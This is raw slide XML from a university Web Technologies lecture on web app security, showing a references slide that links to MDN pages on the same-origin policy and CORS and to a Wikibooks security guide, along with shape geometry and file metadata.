                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4145" y="205648"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="259691"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1875" y="283920"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10048" y="303791"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23199" y="318091"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40004" y="325604"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45084" y="325096"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53909" y="325096"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100451" y="302315"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114811" y="239921"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="127771" y="199783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142596" y="160767"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153910" y="118708"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="156337" y="69445"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="156082" y="68556"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="156718" y="67413"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="156337" y="65762"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="151602" y="43981"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="143224" y="23915"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130512" y="8326"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112826" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8558783" y="3312588"/>
            <a:ext cx="355600" cy="474980"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="355600" h="474979">
                <a:moveTo>
                  <a:pt x="295513" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="276461" y="7439"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="259207" y="25987"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240641" y="72231"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="213437" y="116120"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="180330" y="158006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144056" y="198242"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107351" y="237182"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72949" y="275180"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43587" y="312588"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21999" y="349759"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10922" y="387048"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6322" y="395918"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3175" y="403336"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1170" y="410801"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="419814"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="480" y="439600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12223" y="455136"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31539" y="466695"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54737" y="474551"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67730" y="473170"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80105" y="468741"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="91670" y="460835"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="102235" y="449024"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="124743" y="392925"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="149753" y="346262"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="176736" y="306704"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="205165" y="271919"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="234512" y="239574"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="264249" y="207338"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="293848" y="172879"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322780" y="133865"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="350520" y="87963"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="355274" y="67107"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="354933" y="47037"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="348734" y="29206"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="335915" y="15065"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315589" y="2823"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="295513" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315072" y="3389927"/>
            <a:ext cx="183515" cy="470534"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="183515" h="470535">
                <a:moveTo>
                  <a:pt x="63563" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="25288" y="11437"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="45021"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="68409"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19116" y="123697"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31324" y="176322"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="39121" y="227056"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45009" y="276673"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="51484" y="325945"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61048" y="375646"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76200" y="426549"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110811" y="466054"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130555" y="470364"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="138049" y="470237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="141477" y="466681"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="163014" y="459206"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="176895" y="444313"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="183036" y="424158"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="181355" y="400895"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="169797" y="350392"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162708" y="303645"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="157546" y="258270"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="151766" y="211879"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142824" y="162087"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128178" y="106507"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105282" y="42755"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100282" y="20518"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="84423" y="6115"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63563" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7237124" y="3037322"/>
            <a:ext cx="139065" cy="254635"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="139065" h="254635">
                <a:moveTo>
                  <a:pt x="97192" y="252358"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="87219" y="252358"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="93315" y="254263"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95601" y="252993"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="97192" y="252358"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="139065" h="254635">
                <a:moveTo>
                  <a:pt x="62823" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="40737" y="1660"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23284" y="9346"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8653" y="24663"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="44862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="478" y="67192"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7685" y="106293"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12606" y="141011"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29688" y="209305"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="51325" y="243199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="84679" y="252993"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="87219" y="252358"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="97192" y="252358"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117054" y="244433"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132161" y="229181"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="139053" y="209452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135860" y="187461"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="123795" y="149129"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="118302" y="108737"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114286" y="72179"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106650" y="45348"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106269" y="43951"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106777" y="43189"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106650" y="41665"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96565" y="21967"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81694" y="7423"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62823" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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13" name="object 13" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6782789" y="3318843"/>
            <a:ext cx="357505" cy="468630"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="357504" h="468629">
                <a:moveTo>
                  <a:pt x="61636" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9663" y="27636"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="65748"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6502" y="85518"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35361" y="119591"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63338" y="159853"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90670" y="204296"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144349" y="297706"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="171170" y="342660"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="198295" y="383773"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="225961" y="419039"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="254406" y="446452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="260840" y="455723"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="271583" y="462232"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="284660" y="466312"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298094" y="468296"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="307304" y="468254"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="346840" y="444519"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="356989" y="403300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="345465" y="384476"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="312195" y="352054"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280895" y="313946"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="251335" y="271766"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="223283" y="227127"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="196508" y="181644"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="170779" y="136930"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="145866" y="94599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="121537" y="56265"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="97561" y="23542"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80010" y="6276"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61636" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962050" y="557529"/>
            <a:ext cx="4095115" cy="57404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160"/>
              <a:t>REFERENCES</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-180"/>
              <a:t>(2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="object 16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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="object 17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dirty="0" spc="-25"/>
              <a:t>46</a:t>
            </a:fld>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="object 15" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962050" y="1533220"/>
            <a:ext cx="9814560" cy="301180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240029" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3195"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="95"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Same-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="45" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Policy</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="241300" marR="113030">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="220"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-30" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://developer.mozilla.org/en-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>US/docs/Web/Security/Same-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>origin_policy</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="685165" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Cross-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-45" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Resource</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-60" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Sharing</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-60" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>(CORS) </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-30" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://developer.mozilla.org/en-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>US/docs/Web/HTTP/CORS</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="994"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-90" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Application</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-85" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Security</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-75" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Guide</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-75" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>(from</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-70" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Wikibooks) </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="004352"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="004352"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://en.wikibooks.org/wiki/Web_Application_Security_Guide</a:t>
            </a:r>
            <a:endParaRPr sz="2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LUIGI LIBERO LUCIO STARACE</dc:creator>
  <dc:title>PowerPoint Presentation</dc:title>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-04-12T10:16:02Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-04-12T10:16:02Z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2024-06-05T00:00:00Z</vt:filetime>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="Creator">
    <vt:lpwstr>Microsoft® PowerPoint® for Microsoft 365</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="LastSaved">
    <vt:filetime>2025-04-12T00:00:00Z</vt:filetime>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="5" name="MSIP_Label_2ad0b24d-6422-44b0-b3de-abb3a9e8c81a_ActionId">
    <vt:lpwstr>9af74b0e-ab53-453f-acd9-6db9dfe131b8</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="6" name="MSIP_Label_2ad0b24d-6422-44b0-b3de-abb3a9e8c81a_ContentBits">
    <vt:lpwstr>0</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="7" name="MSIP_Label_2ad0b24d-6422-44b0-b3de-abb3a9e8c81a_Enabled">
    <vt:lpwstr>true</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="8" name="MSIP_Label_2ad0b24d-6422-44b0-b3de-abb3a9e8c81a_Method">
    <vt:lpwstr>Standard</vt:lpwstr>
  </property>
